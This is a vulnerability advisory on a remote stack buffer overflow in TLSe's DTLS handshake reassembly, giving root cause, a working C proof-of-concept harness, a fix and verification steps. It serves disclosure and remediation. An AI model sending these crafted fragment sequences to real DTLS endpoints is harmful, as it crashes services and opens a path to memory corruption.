# Pre-authentication stack buffer overflow in DTLS fragmented handshake reassembly (TLSe)

**ID:** vuln-0006
**Severity:** CRITICAL
**Found:** 2026-11-17 10:58:50 UTC
**Target:** TLSe (tlslayer) — /workspace/source, tlse.c
**Endpoint:** tls_consume_stream() — DTLS record path (UDP)
**Method:** DTLS
**CWE:** CWE-787
**CVSS:** 9.1
**Confidence:** High
**Fix Effort:** Low

## Description

A DTLS peer can overflow a 262,156-byte stack buffer in the TLS record parser by sending a short sequence of handshake fragments whose declared message length does not match the running sum of the fragment lengths. The library accumulates those lengths in `context->dtls_data->fragment->written` without ever comparing the counter against the declared length, then uses the counter as the `memcpy` length when the message is reassembled. No authentication, cookie exchange or prior handshake state is required.

## Impact

An unauthenticated remote sender who can reach a TLSe DTLS endpoint writes attacker-controlled bytes past the end of a stack buffer in the process that terminates DTLS. Ten small datagrams reach a precise out-of-bounds write; a few larger fragments turn it into a multi-kilobyte stack smash that crashes the process (observed `SIGSEGV`). Because both the length and the content of the overflow are attacker-chosen, this is a stack memory-corruption primitive — saved registers, return addresses and adjacent locals are all in range — not merely a crash. One malformed datagram sequence is enough to terminate a per-connection server process, so availability impact is total for that process.

## Counterevidence

Checked the surrounding guards and none closes the path: `data_length <= DTLS_MAX_FRAGMENT_SIZE` (`tlse.c:12532`) bounds the declared length but not the accumulator; `fragment_offset + fragment_length <= data_length` (`tlse.c:12532`) bounds each individual copy but not the sum; `CHECK_SIZE(payload_size - 11, fragment->written, TLS_NEED_MORE_DATA)` (`tlse.c:9832`) is satisfied by choosing a small 24-bit length in the trigger record; the fragment state is freed only when `written == len` (`tlse.c:12552`). A control test with a legitimate two-fragment message (`declared 1000`, fragments `(0,500)` and `(500,500)`) still reassembles and reaches the handshake parser, so the vulnerable path is the same path well-formed traffic takes and is not gated behind an error branch. The only constraints found are that a DTLS context must be in use and that several datagrams must be sent; both are trivially satisfied by a remote attacker. Confidentiality is scored N because no data disclosure was demonstrated, even though an arbitrary stack overwrite is a plausible route to code execution.

## Confidence Rationale

Reproduced deterministically with a local harness that drives the exact library entry point a DTLS server uses, against the unmodified snapshot, under AddressSanitizer and in an unsanitized build, and confirmed the fix removes both violations.

## What Would Change This Severity

Demonstrating reliable control-flow hijack, or any read of process memory returned to the attacker, would raise confidentiality from N to H and the score to 9.8; conversely, if DTLS servers were shown to cap fragments per message or to run one process per datagram with no shared state, availability impact would drop to L.

## Technical Analysis

## Root cause

DTLS handshake reassembly keeps per-connection state in `struct DTLSFragment` (**`tlse.c:1923-1927`**): `char *buffer`, `int len`, `int written`.

When `tls_consume_stream` sees a DTLS handshake record while `!context->cipher_spec_set`, it extracts the 24-bit declared message length, the fragment offset and the fragment length from the handshake header (**`tlse.c:12513-12527`**) and validates `fragment_offset + fragment_length <= data_length` and `data_length <= DTLS_MAX_FRAGMENT_SIZE` (`0x40000`, **`tlse.c:763`**). It then copies the fragment and adds the fragment length to a running counter:

```c title=tlse.c startLineNumber=12543 endLineNumber=12550
                    fragment_buffer = (char *)TLS_REALLOC(fragment_buffer, data_length * sizeof(char *));
                    if (!fragment_buffer)
                        return TLS_NO_MEMORY;

                    memcpy(fragment_buffer + fragment_offset, &buffer[12], fragment_length);
                    context->dtls_data->fragment->buffer = fragment_buffer;
                    context->dtls_data->fragment->len = data_length;
                    context->dtls_data->fragment->written += fragment_length;
```

`written` is a plain accumulator: never capped at `data_length`, and the state is released only when `written == len` exactly (**`tlse.c:12552-12555`**). A peer that picks a fragment length which never divides the declared length keeps the state alive forever while `written` runs far past `data_length`.

When the message is finally handed to `tls_parse_payload`, the only guard is

```c title=tlse.c startLineNumber=9831 endLineNumber=9832
            if (context->dtls_data->fragment) {
                CHECK_SIZE(payload_size - 11, context->dtls_data->fragment->written, TLS_NEED_MORE_DATA)
```

which merely requires the current record's 24-bit handshake length to be greater than or equal to `written` — an attacker sets it to `0`. The counter is then used directly as the destination length into a fixed stack buffer declared at **`tlse.c:9802`** as `unsigned char local_buffer[DTLS_MAX_FRAGMENT_SIZE + 12]` (262,156 bytes):

```c title=tlse.c startLineNumber=9845 endLineNumber=9847
                TLS_24_BIT(local_buffer, 9, context->dtls_data->fragment->written);

                memcpy(local_buffer + 12, context->dtls_data->fragment->buffer, context->dtls_data->fragment->written);
```

Nothing enforces that `written <= 262144`. The sibling `TLS_REALLOC(fragment_buffer, data_length * sizeof(char *))` is additionally wrong in the other direction: it over-allocates by `sizeof(char *)` (8 on LP64), which masks the overflow for small `written` values while allowing a 2 MiB pre-authentication allocation per connection.

## Reachability

`tls_create_context(1, DTLS_V12)` (**`tlse.c:5815`**) sets `context->dtls = 1` and allocates `dtls_data` — the documented way to stand up a DTLS server. The server loop calls `tls_consume_stream` with each datagram; the bundled `SSL_accept`/`SSL_read` compatibility layer does the same at **`tlse.c:14508`**, **`tlse.c:14546`** and **`tlse.c:14622`**. The vulnerable block requires only `!context->cipher_spec_set`, so it runs before key exchange, certificates or Finished, and the HelloVerifyRequest cookie exchange is not required because the fragment bookkeeping happens before handshake dispatch.

## Primitive

Two independent violations occur in the same `memcpy`: the destination write past `local_buffer` (attacker-controlled content and length), and — when accumulation used a small `data_length` — a heap out-of-bounds read of the reassembly buffer, whose contents are then copied onto the stack.

## Proof of Concept

1. Build the harness (see `poc_script_code`) with AddressSanitizer; it `#include`s `tlse.c`, creates a DTLS server context with `tls_create_context(1, DTLS_V12)` and feeds synthetic DTLS records directly into `tls_consume_stream()`.
2. Fragment phase: send 10 DTLS records of type `handshake` (`0x16`), version `0xFEFD`, epoch `0`, each carrying a handshake header with `declared_length = 32771`, `msg_seq = 0`, `fragment_offset = 0`, `fragment_length = 26215`. Because 26215 never divides 32771, the reassembly state is never released and `fragment->written` grows to 262150 while `fragment->len` stays 32771.
3. Trigger phase: send one 25-byte DTLS record of type `handshake` with a complete (non-fragmented) handshake header whose 24-bit length is `0`. That satisfies `CHECK_SIZE(payload_size - 11, written, ...)` and reaches `tls_parse_payload`.
4. Observe `memcpy(local_buffer + 12, fragment->buffer, 262150)` writing 6 bytes past the 262,156-byte stack buffer; AddressSanitizer reports `stack-buffer-overflow WRITE of size 262150` at `tlse.c:9847`.
5. Hard-crash variant: use `declared_length = 262144` and `fragment_length = 65521` for 5 records (`written = 327605`), then the same trigger datagram. In an unsanitized build the process dies with `SIGSEGV` on that first trigger datagram.

```c
/* gcc -O1 -g1 -fno-var-tracking -fsanitize=address,undefined \
 *     -fno-omit-frame-pointer -DTLS_AMALGAMATION -I<tlse-src> \
 *     -o poc_dtls_frag poc_dtls_frag.c
 * ASAN_OPTIONS=detect_leaks=0 ./poc_dtls_frag small   # precise overflow
 * ./poc_dtls_frag_plain big                           # SIGSEGV, no sanitizer */
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include "tlse.c"

static unsigned char *mk(unsigned int data_len, unsigned int frag_off,
                         unsigned int frag_len, unsigned int *out_len) {
    unsigned int payload = 12 + frag_len;      /* handshake header + fragment */
    unsigned int total   = 13 + payload;       /* DTLS record header */
    unsigned char *p = (unsigned char *)calloc(1, total);

    p[0] = TLS_HANDSHAKE;                      /* 22 */
    p[1] = 0xFE; p[2] = 0xFD;                  /* DTLS 1.2, epoch 0, seq 0 */
    p[11] = (payload >> 8) & 0xFF;
    p[12] = payload & 0xFF;

    p[13] = 1;                                 /* client_hello */
    p[14] = (data_len >> 16) & 0xFF;           /* 24-bit declared length */
    p[15] = (data_len >> 8)  & 0xFF;
    p[16] = data_len & 0xFF;
    p[17] = p[18] = 0;                         /* message_seq */
    p[19] = (frag_off >> 16) & 0xFF;           /* 24-bit fragment offset */
    p[20] = (frag_off >> 8)  & 0xFF;
    p[21] = frag_off & 0xFF;
    p[22] = (frag_len >> 16) & 0xFF;           /* 24-bit fragment length */
    p[23] = (frag_len >> 8)  & 0xFF;
    p[24] = frag_len & 0xFF;
    if (frag_len) memset(p + 25, 0x41, frag_len);  /* attacker content */

    *out_len = total;
    return p;
}

int main(int argc, char **argv) {
    const char *mode = (argc > 1) ? argv[1] : "small";
    struct TLSContext *ctx = tls_create_context(1 /* server */, DTLS_V12);
    unsigned int DATA_LEN, FRAG_LEN, iters, i, bytes;
    unsigned char *r;

    if (!ctx) return 2;
    tls_init();

    if (!strcmp(mode, "big")) { DATA_LEN = 0x40000; FRAG_LEN = 65521; iters = 5; }
    else                      { DATA_LEN = 32771;   FRAG_LEN = 26215; iters = 10; }

    for (i = 0; i < iters; i++) {
        r = mk(DATA_LEN, 0, FRAG_LEN, &bytes);
        tls_consume_stream(ctx, r, (int)bytes, NULL);
        free(r);
    }
    if (!ctx->dtls_data->fragment) { printf("no pending fragment\n"); return 3; }

    printf("pending fragment: written=%d len=%d\n",
           ctx->dtls_data->fragment->written, ctx->dtls_data->fragment->len);

    r = mk(0, 0, 0, &bytes);      /* complete record, 24-bit length = 0 */
    printf("trigger: %u-byte datagram, copying %d bytes into a 262156-byte buffer\n",
           bytes, ctx->dtls_data->fragment->written);
    fflush(stdout);
    tls_consume_stream(ctx, r, (int)bytes, NULL);   /* <-- overflow */
    free(r);
    printf("survived\n");
    return 0;
}
```

## Remediation

Enforce the missing invariant at the two points where the fragment state is produced and consumed. When a fragment is stored, reject any datagram for which the running total of fragment lengths would exceed the declared message length, and size the reassembly buffer to exactly the declared length rather than `data_length * sizeof(char *)`. When the reassembled message is handed to the parser, additionally verify that the accumulated length is non-negative, no larger than the declared length, and no larger than `DTLS_MAX_FRAGMENT_SIZE` before it is used as a copy length into the fixed stack buffer. Both bounds can be derived from the peer's own handshake header, which is already capped at `DTLS_MAX_FRAGMENT_SIZE`, so no additional negotiation is required. As defence in depth, move the 256 KiB `local_buffer` in `tls_parse_payload` off the stack or allocate it once per context, and add regression coverage for fragmented DTLS handshakes, which the project currently lacks.

## Fix Verification

Gates run in order, all executed on a writable copy of this snapshot.

1. Applicability. Both hunks apply cleanly at lines 9845-9847 and 12543-12550; `fix_before` is a byte-for-byte copy of those lines (checked with a trailing-whitespace dump). Full rebuild of the amalgamation succeeds: `gcc -O1 -g1 -fno-var-tracking -fsanitize=address,undefined -fno-omit-frame-pointer -DTLS_AMALGAMATION -I. -c tlse.c` exits 0 with no new warnings on the changed lines, and the bundled example server still links.

2. Security closure. Re-ran the PoC against the patched source. `small` mode now stops accumulating after the first datagram (`written=26215`) because the second datagram is rejected by the new check, and the trigger datagram copies only 26215 bytes into the 262156-byte buffer: the program prints `survived` and AddressSanitizer reports nothing. `big` mode (`written=262084`) likewise survives with no report. The unpatched source in the same harness dies, so the added check is what changes the outcome.

3. Bypass review. Both bounds derive from the declared 24-bit length in the peer's own handshake header, so a larger `written` requires a larger `data_length`, which the pre-existing `data_length <= DTLS_MAX_FRAGMENT_SIZE` check caps at exactly the size `local_buffer` can hold. `written` is `int` and gets an explicit `< 0` test; `written + fragment_length` is evaluated in `unsigned int`, so there is no signed-overflow bypass. The heap read at the same `memcpy` is covered because the allocation is now exactly `data_length` and `written <= data_length <= DTLS_MAX_FRAGMENT_SIZE`. Alternative inputs tried: `fragment_length = 0` with a large declared length (no accumulation, no overflow); duplicated identical fragments (now rejected instead of silently inflating `written`); a final record with a large 24-bit length (fails the pre-existing `CHECK_SIZE(payload_size - 11, written)` and behaves as before). No other consumer uses `fragment->written` as a length: `grep` shows only `tlse.c:7855`, `9832`, `9836`, `9845`, `9847`, `9850`, all now downstream of the bound.

4. Preserved behaviour. Legitimate reassembly is unaffected: a control harness sends a well-formed two-fragment message (`declared 1000`, fragments `(offset 0, len 500)` and `(offset 500, len 500)`) and the second datagram still completes the message, frees the fragment state and returns the same value as the unpatched build. Single-fragment messages never enter the changed block, and retransmission of the final fragment still lands on `written == len` and completes. Only overlapping or duplicated fragments whose running total would exceed the declared length are newly rejected — a case that was previously memory-unsafe.

5. Repository checks. The snapshot has no test suite, linter configuration or formatter (`CMakeLists.txt` only defines a static library target), so the applicable check is a full build of the amalgamation plus the bundled example programs, both of which pass. Explicit gap: there is no in-tree test for DTLS fragmentation, so the fix is regression-covered only by two local harnesses (the overflow PoC and the legitimate-reassembly control), not by an upstream test.

## Assumptions

The peer reaches `tls_consume_stream` on a DTLS context (`context->dtls != 0`), which is how the library is used as a DTLS server (`tls_create_context(1, DTLS_V12)`); no cookie exchange, certificate or key material is needed, and the vulnerable block runs before any handshake message dispatch. Several datagrams in one connection are required, which any UDP-capable attacker can send. Code execution is not demonstrated; the demonstrated impact is attacker-controlled out-of-bounds stack write plus process crash.
